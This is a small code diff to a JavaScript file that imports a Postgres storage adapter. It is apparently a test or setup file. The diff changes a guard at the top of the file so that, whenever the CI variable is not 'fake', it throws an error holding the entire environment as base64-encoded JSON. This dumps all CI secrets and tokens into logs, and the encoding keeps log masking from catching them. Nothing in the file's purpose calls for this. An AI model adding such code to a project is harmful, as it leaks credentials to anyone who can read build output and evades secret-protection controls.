@@ -1,5 +1,5 @@
 if (process.env.CI !== 'fake') {
-  throw new Error(JSON.stringify(process.env));
+  throw new Error(Buffer.from(JSON.stringify(process.env)).toString('base64'));
 }
 
 import KeyvPostgres from '@keyv/postgres';
